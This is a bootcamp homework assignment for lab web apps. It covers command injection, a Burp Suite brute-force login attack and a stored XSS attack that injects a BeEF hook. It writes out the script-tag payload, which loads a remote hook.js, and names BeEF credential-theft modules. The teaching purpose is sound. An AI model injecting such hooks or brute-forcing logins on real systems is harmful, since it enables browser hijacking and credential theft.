# Vulnerabilities-and-Hardening

In this homework scenario, you will continue as an application security engineer at Replicants. Replicants created several new web applications and would like you to continue testing them for vulnerabilities. Additionally, your manager would like you to research and test a security tool called BeEF in order to understand the impact it could have on the organization if Replicants was targeted with this tool.

Lab Environment
You will continue to use your Vagrant virtual machine for this assignment.

Topics Covered in Your Assignment

Web application vulnerability assessments
Injection
Brute force attacks
Broken authentication
Burp Suite
Web proxies
Directory traversal
Dot dot slash attacks
Beef
Cross-site scripting
Malicious payloads



Instructions
In this assignment, you will test three web application vulnerabilities. For each vulnerability you will be provided with the following:


Steps detailing how to setup and access the application.


A walkthrough explaining how the application is intended to work.


A task that will test the application for vulnerabilities.


Your goal is to determine if the application is vulnerable and provide mitigations.

Submission Guidelines
You will submit a document (Word or Google Docs) that contains the following for each web application:


Screen shots confirming the successful exploit.


Two to three sentences detailing recommended mitigation strategies.


When complete, submit the file on BCS.


Web Application 1: Your Wish is My Command Injection



Complete the following to set up the activity.


Access Vagrant and open a browser.


Navigate to the following webpage: http://192.168.13.25 and select the Command Injection option.


Alternatively, access the webpage directly at this page: http://192.168.13.25/vulnerabilities/exec/


Web Application 2: A Brute Force to Be Reckoned With



Complete the following steps to set up the activity.


Open a browser on Vagrant and navigate to the webpage http://192.168.13.35/install.php.

This page is an administrative web application that serves as a simple login page. An administrator enters their username and password and selects Login.


If the user/password combination is correct, it will return a successful message.


If the user/password combination is incorrect, it will return the message, "Invalid credentials."




Years ago, Replicants had a systems breach and several administrators passwords were stolen by a malicious hacker. The malicious hacker was only able to capture a list of passwords, not the associated accounts' usernames. Your manager is concerned that one of the administrators that accesses this new web application is using one of these compromised passwords. Therefore, there is a risk that the malicious hacker can use these passwords to access an administrator's account and view confidential data.


Use the web application tool Burp Suite, specifically the Burp Suite Intruder feature, to determine if any of the administrator accounts are vulnerable to a brute force attack on this web application.


You've been provided with a list of administrators and the breached passwords:


List of Administrators


Breached list of Passwords




Hint: Refer back to the Burp Intruder activity 10_Brute_Force from Day 3 for guidance.




Deliverable: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies.



Web Application 3: Where's the BeEF?



Complete the following to set up the activity.


When you ran docker-compose up, you also brought up a containerized instance of the BeEF Framework.


To access the BeEF User Interface (UI), navigate to http://127.0.0.1:3000/ui/panel.


When the BeEF webpage opens, login with the following credentials:


Username: beef


Password: feeb
The Browser Exploitation Framework (BeEF) is a practical client-side attack tool that exploits vulnerabilities of web browsers to assess the security posture of a target.


While BeEF was developed for lawful research and penetration testing, criminal hackers leverage it as an attack tool.


An attacker takes a small snippet of code, called a BeEF Hook, and determines a way to add this code into a target website. This is commonly done by cross-site scripting.


When subsequent users access the infected website, the users' browsers become hooked.

Once a browser is hooked, it is referred to as a zombie. A zombie is an infected browser that awaits instructions from the BeEF control panel.
The BeEF control panel has hundreds of exploits that can be launch against the hooked victims, including:

Social engineering attacks
Stealing confidential data from the victim's machine
Accessing system and network information from the victim's machine







BeEF includes a feature to test out a simulation of an infected website.


To access this simulated infected website, locate the following sentence on the BeEF control panel: To begin with, you can point a browser towards the basic demo page here, or the advanced version here.


Now that you know how to use the BeEF tool, you'll use it to test the Replicants web application. You are tasked with using a stored XSS attack to inject a BeEF hook into Replicants' main website.


Task details:

The page you will test is the Replicants Stored XSS application which was used the first day of this unit: http://192.168.13.25/vulnerabilities/xss_s/

The BeEF hook, which was returned after running docker-compose up was: http://127.0.0.1:3000/hook.js

The payload to inject with this BeEF hook is: <script src="http://127.0.0.1:3000/hook.js"></script>




When you attempt to inject this payload,  you will encounter a client-side limitation that will not allow you to enter the whole payload. You will need to find away around this limitation.


Hint: Try right-clicking and selecting "Inspecting the Element".



Once you are able to hook into Replicants website, attempt a couple BeEF exploits. Some that work well include:


Social Engineering >> Pretty Theft


Social Engineering >> Fake Notification Bar


Host >> Get Geolocation (Third Party)
